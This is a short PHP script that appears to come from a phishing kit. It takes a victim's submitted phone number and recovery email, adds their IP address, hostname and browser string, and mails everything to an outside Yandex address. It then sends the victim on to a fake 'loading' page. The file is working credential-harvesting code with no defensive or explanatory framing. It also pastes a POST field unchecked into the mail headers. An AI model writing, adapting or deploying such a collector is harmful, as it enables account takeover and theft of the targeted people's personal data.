<?php

$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];


$message .= "Phone # & Recovery Email\n";
$message .= "******************************\n";
$message .= "Phone Number: ".$_POST['PhoneNumber']."\n";
$message .= "Recovery Email: ".$_POST['RecoveryEmail']."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "IP Address $ip on $time\n";
$message .= "Browser: $useragent\n";
$message .= "=======================================\n";
$message .= "Created by S.Wire\n";
$message .= "=======================================\n";


$recipient ="alexfaward@yandex.com";
$subject = "$ip";
$headers = "From: COPY<alexfaward@yandex.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

 mail("$to","$subject", $message);
if (mail($recipient,$subject,$message,$headers))
       {
		   header("Location: loading.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
